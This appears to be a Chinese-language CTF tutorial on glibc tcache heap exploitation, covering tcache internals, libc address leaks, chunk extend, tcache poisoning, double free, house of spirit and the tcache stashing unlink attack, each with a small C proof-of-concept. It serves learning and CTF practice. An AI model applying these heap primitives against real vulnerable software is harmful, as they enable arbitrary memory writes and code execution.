# tcache bin 基础

  * tcache机制是glibc 2.26之后引入的一种技术，它提高了堆管理器的性能，但是舍弃了很多的安全检查，所以有多种利用方式，现在的题目一般都基于更新版本的libc，tcache肯定是必不可少的一环，而且是最开始的那一环。

  * 1.每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk，64位机器16字节递增，从0x20到0x410，也就是说位于以上大小的chunk释放后都会先行存入到tcache bin中。

  * 2.对于每个tcache bin单链表，它和fast bin一样都是先进后出，而且prev_inuse标记位都不会被清除，所以tcache bin中的chunk不会被合并，即使和Top chunk相邻。

  * tcache机制出现后，每次产生堆都会先产生一个0x250大小的堆块，该堆块位于堆的开头，用于记录64个bins的地址（这些地址指向用户数据部分）以及每个bins中chunk数量。在这个0x250大小的堆块中，前0x40个字节用于记录每个bins中chunk数量，每个字节对应一条tcache bin链的数量，从0x20开始到0x410结束，刚好64条链，然后剩下的每8字节记录一条tcache bin链的开头地址，也是从0x20开始到0x410结束。还有一点值得注意的是，tcache bin中的fd指针是指向malloc返回的地址，也就是用户数据部分，而不是像fast bin单链表那样fd指针指向chunk头。

tcache_entry

    
    
    typedef struct tcache_entry
    {
      struct tcache_entry *next;
    } tcache_entry;
    

tcache_entry用于链接空闲的chunk结构体，其中next指针指向下一个大小相同的chunk。（fd指向fd）

![](./img/7226384907343499935.png)

tcache_perthread_struct

    
    
    typedef struct tcache_perthread_struct
    {
      char counts[TCACHE_MAX_BINS];
      tcache_entry *entries[TCACHE_MAX_BINS];
    } tcache_perthread_struct;
    
    # define TCACHE_MAX_BINS               
    
    static __thread tcache_perthread_struct *tcache = NULL;
    

tcache_perthread_struct：管理tcache链表的，位于heap段的起始位置，size大小为0x251  
tcache_entry ：用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk  
counts ：记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk

tcache_perthread_struct、tcache_entry和malloc_chunk三者的关系如下

![](./img/2343941145768912116.png)

## 执行流程

  * 第一次malloc时，回显malloc一块内存用来存放tcache_perthread_struct，这块内存size一般为0x251。
  * 释放chunk时，如果chunk的size小于small bin size，在进入tcache之前会先放进fastbin或者unsorted bin中。

  * 在放入tcache后：

  * 先放到对应的tcache中，直到tcache被填满（7个）
  * tcache被填满后，接下来再释放chunk，就会直接放进fastbin或者unsorted bin中
  * tcache中的chunk不会发生合并，不取消inuse bit
  * 重新申请chunk，并且申请的size符合tcache的范围，则先从tcache中取chunk，直到tcache为空
  * tcache为空时，如果fastbin、small bin、unsorted bin中有size符合的chunk，会先把fastbin、small bin、unsorted bin中的chunk放到tcache中，直到填满，之后再从tcache中取

  * 需要注意的是，在采用tcache的情况下，只要是bin中存在符合size大小的chunk，那么在重启之前都需要经过tcache一手。并且由于tcache为空时先从其他bin中导入到tcache，所以此时chunk在bin中和在tcache中的顺序会反过来  
## 绕过tcache

    
        #include <stdio.h>
    #include <stdlib.h>
    int main()
    {
      long long *ptr[7];
      long long *a = malloc(0x80);
      for (int i=0; i<7; i++)
          ptr[i] = malloc(0x80);
      for (int i=0; i<7; i++)
          free(ptr[i]);
      free(a);
      printf("libc addr is %llx\n", (long long)a[0]);
      return 0;
    }
    

![](./img/1609993788536240958.png)  
然后再free(a);  
![](./img/9193420394736063021.png)  
tcache机制无非就是增加了一层缓存，如果我们还是想使用fast bin/unsorted bin等的性质，那么需要将对应的tcache
bin填满，然后再执行相应的操作就可以了。

## 泄露libc

1.先绕过tcache bin 然后利用unsorted bin

![](./img/8796967943969724383.png)

2.直接分配大于等于0x410的chunk，这里要防止堆块和top chunk合并

    
    
    #include <stdio.h>
    #include <stdlib.h>
    
    int main()
    {
        long long * ptr = malloc(0x410);
        malloc(0x10);
        free(ptr);
        printf("leak libc addr is %p\n", (long long)ptr[0]);
    
        return 0;
    }
    

![](./img/3524680397448507131.png)  
calloc  
calloc函数不会分配tcache
bin中的堆块，因此如果题目中出现了calloc函数，我们可以想到利用该函数直接绕过tcache，从而获得其它bin上的chunk。示例代码如下，先申请并释放了8个chunk，使得最后一个chunk留在fast
bin上，此时再调用calloc就会直接获取fast bin上的chunk块。

    
    
    #include <stdio.h>
    #include <stdlib.h>
    int main()
    {
        void * ptr[8];
        for (int i=0; i<8; i++)
            ptr[i] = malloc(0x10);
        for (int i=0; i<8; i++)
            free(ptr[i]);
        calloc(1, 0x10);
        return 0;
    }
    

![](./img/526064967555012132.png)

calloc(1, 0x10);

![](./img/9087536818915633013.png)

# tcache extend

tcache机制情况下的chunk extend，相比较于fastbin，tcache机制的加入使得漏洞利用更简单，因此实现chunk
extend也更轻松，不用正确标记next
chunk的size,只需要修改当前chunk的size。我们free再malloc后就可以获得对应大小的chunk，这里演示的情况是通过chunk
extend覆盖了next chunk的头部。

    
    
    #include <stdio.h>
    #include <stdlib.h>
    
    int main()
    {
        long long *p1 = malloc(0x80);
        long long *p2 = malloc(0x20);
    
        printf("addr is %p, size is %p\n", p1, p1[-1]);
        p1[-1] = 0xa1;
        free(p1);
        p1 = malloc(0x90);
        printf("addr is %p, size is %p\n", p1, p1[-1]);
    
        return 0;
    }
    

![](./img/9075328025980293573.png)

# tcache poisoning

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <stdint.h>
    #include <assert.h>
    
    int main()
    {
            setbuf(stdin, NULL);
            setbuf(stdout, NULL);
    
            size_t target;
            printf("target is : %p.\n", (char *)&target);
    
            intptr_t *a = malloc(128);
            intptr_t *b = malloc(128);
    
            free(a);
            free(b);
    
            b[0] = (intptr_t)&target;
    
            malloc(128);
            intptr_t *c = malloc(128);
            printf("malloc_point is target: %p\n", c);
    
            assert((long)&target == (long)c);
            return 0;
    }
    

很简单，就是把目标地址伪造成tcache bin，可以和堆溢出相互结合

![](./img/7913158760848617057.png)

![](./img/9200822788657662944.png)

![](./img/5528466420400072639.png)

# tcache dup

利用的是tcache_put()未做安全检查的缺陷

在具备tcache机制的情况下，申请释放内存的时候，_int_free()函数会调用tcache_put()函数，tcache_put()函数会按照size对应的idx将已释放块挂进tcache
bins链表中。插入的过程也很简单，根据_int_free()函数传入的参数，将被释放块的malloc指针交给next成员变量。其中没有任何安全检查和保护机制，在大服务提高性能的同时，安全性几乎舍弃了大半。

因为没有做任何的检查，所以我们可以对同一个chunk多次free，这就会造成cycliced list。我们在fastbin attack中经常用到

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <assert.h>
    
    int main()
    {
            int *a = malloc(8);
    
            free(a);
            free(a);
    
            void *b = malloc(8);
            void *c = malloc(8);
            printf("Next allocated buffers will be same: [ %p, %p ].\n", b, c);
    
            assert((long)b == (long)c);
            return 0;
    }
    

这里就是简单的double free

# tcache house of spirit

tcache house of
spirit这种利用方式是由于tcache_put()函数检查不严格造成的，在释放的时候没有检查被释放的指针是否真的是堆块的malloc指针，如果我们构造一个size符合tcache
bin size的fake_chunk，那么理论上讲其实可以将任意地址作为chunk进行释放。这里就直接采用wiki上面列出的例子进行讲解了：

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <assert.h>
    
    int main()
    {
            setbuf(stdout, NULL);
    
            malloc(1);
    
            unsigned long long *a;
            unsigned long long fake_chunks[10];
    
            printf("fake_chunk addr is %p\n", &fake_chunks[0]);
            fake_chunks[1] = 0x40; 
            a = &fake_chunks[2];
            free(a);
    
            void *b = malloc(0x30);
            printf("malloc(0x30): %p\n", b);
    
            assert((long)b == (long)&fake_chunks[2]);
    }
    

简单来说就是因为tcache的安全检测不足导致，伪造的堆块也可以被释放（这里前面还申请了一个堆块防止free后的堆块与top chunk合并）

    
    
    unsigned long long *a;
            unsigned long long fake_chunks[10];
    
            printf("fake_chunk addr is %p\n", &fake_chunks[0]);
            fake_chunks[1] = 0x40; 
            a = &fake_chunks[2];
            free(a);
    

![](./img/6293411729156096544.png)  
接着我们就可以把这一段chunk申请出来

## tcache stashing unlink attack

这种攻击利用的是tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small
bin会放进tcache中，这种情况可以使用calloc分配同大小堆块触发，因为calloc分配堆块时不从tcache
bin中选取。在获取到一个smallbin中的一个chunk后，如果tcache任由足够空闲位置，会将剩余的smallbin挂进tcache中，在这个过程中只对第一个bin进行了完整性检查，后面的堆块的检查缺失。当攻击者可以修改一个small
bin的bk时，就可以实现在任意地址上写一个libc地址。构造得当的情况下也可以分配fake_chunk到任意地址。

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <assert.h>
    
    int main(){
        unsigned long stack_var[0x10] = {0};
        unsigned long *chunk_lis[0x10] = {0};
        unsigned long *target;
    
        setbuf(stdout, NULL);
    
        printf("stack_var addr is:%p\n",&stack_var[0]);
        printf("chunk_lis addr is:%p\n",&chunk_lis[0]);
        printf("target addr is:%p\n",(void*)target);
    
        stack_var[3] = (unsigned long)(&stack_var[2]);
    
        for(int i = 0;i < 9;i++){
            chunk_lis[i] = (unsigned long*)malloc(0x90);
        }
    
        for(int i = 3;i < 9;i++){
            free(chunk_lis[i]);
        }
    
        free(chunk_lis[1]);
        free(chunk_lis[0]);
        free(chunk_lis[2]);
    
        malloc(0xa0);
        malloc(0x90);
        malloc(0x90);
    
        chunk_lis[2][1] = (unsigned long)stack_var;
        calloc(1,0x90);
    
        target = malloc(0x90);
    
        printf("target now: %p\n",(void*)target);
    
        assert(target == &stack_var[2]);
        return 0;
    }
    

简单的描述一下这个程序的执行流程：首先创建了一个数组stack_var[0x10]，一个指针数组chunk_lis[0x10]，一个指针target。接下来调用setbuf()函数进行初始化。接着调用printf()函数打印stack_var、chunk_lis首地址及target的地址。接下来将stack_var[2]所在地址放在stack_var[3]中。接着循环创建8个size为0xa0大小的chunk，并将八个chunk的malloc指针依序放进chunk_lis[]中。然后根据chunk_lis[]中的堆块malloc指针循环释放6个已创建的chunk。接下来依序释放chunk_lis[1]、chunk_lis[0]、chunk_lis[2]中malloc指针指向的chunk。然后连续创建三个chunk，第一个size为0xb0，第二个size为0xa0，三个size为0xa0。接下来将chunk_lis[2][1]位置中的内容修改成stack_var的起始地址，接着调用calloc()函数申请一个size为0xa0大小的chunk。最后申请一个size为0xa0大小的chunk，并将其malloc指针赋给target变量，并打印target。

    
    
    unsigned long stack_var[0x10] = {0};
        unsigned long *chunk_lis[0x10] = {0};
        unsigned long *target;
    
        setbuf(stdout, NULL);
    
        printf("stack_var addr is:%p\n",&stack_var[0]);
        printf("chunk_lis addr is:%p\n",&chunk_lis[0]);
        printf("target addr is:%p\n",(void*)target);
    
        stack_var[3] = (unsigned long)(&stack_var[2]);
    

![](./img/4058586771326754133.png)

    
    
    for(int i = 0;i < 9;i++){
            chunk_lis[i] = (unsigned long*)malloc(0x90);
        }
    
        for(int i = 3;i < 9;i++){
            free(chunk_lis[i]);
        }
    

留下了前三个没free

![](./img/888820459484144495.png)

    
    
    for(int i = 3;i < 9;i++){
            free(chunk_lis[i]);
        }
    
        free(chunk_lis[1]);
        free(chunk_lis[0]);
        free(chunk_lis[2]);
    

![](./img/7479446267280586992.png)

![](./img/3597531776555984772.png)

    
    
    malloc(0xa0);
        malloc(0x90);
        malloc(0x90);
    

申请完 0xa0 bins依然没变

![](./img/207040275740648193.png)

这里是由于unsorted bin存取机制的原因，如果此时申请一个size为0xb0大小的chunk，unsorted bin中如果没有符合chunk
size的空闲块（chunk3、chunk1的size小于0xb0），那么unsorted
bin中的空闲块chunk3和chunk1会按照size落在small bin的0xa0链表中

![](./img/5630240902301515441.png)

![](./img/3330128066732344295.png)

chunk_lis[2][1] = (unsigned long)stack_var;

![](./img/1358614145350754222.png)

![](./img/3783328070419652011.png)

![](./img/3347516749950207336.png)

    
    
    calloc(1,0x90);
        target = malloc(0x90);
    

![](./img/8871951958238294630.png)

calloc(1,0x90); 前后

![](./img/3850482503695865526.png)

![](./img/2041639945084366133.png)

为什么要使用calloc进行申请chunk，这是因为calloc在申请chunk的时候不会从tcache
bin中摘取空闲块，如果这里使用malloc的话就会直接从tcache
bin中获得空闲块了。那么在calloc申请size为0xa0大小的chunk的时候就会直接从small bin中获取，那么由于small
bin是FIFO先进先出机制，所以这里被重新启用的是chunk1

    
    
    target = malloc(0x90);
        printf("target now: %p\n",(void*)target);
    

![](./img/7540923915620085357.png)

stack_var重新启用了  
target now: 0x7fffffffdd20

## 参考

<https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/>  
<https://blog.csdn.net/qq_41202237/article/details/113400567>  
<https://blog.csdn.net/A951860555/article/details/115442780>

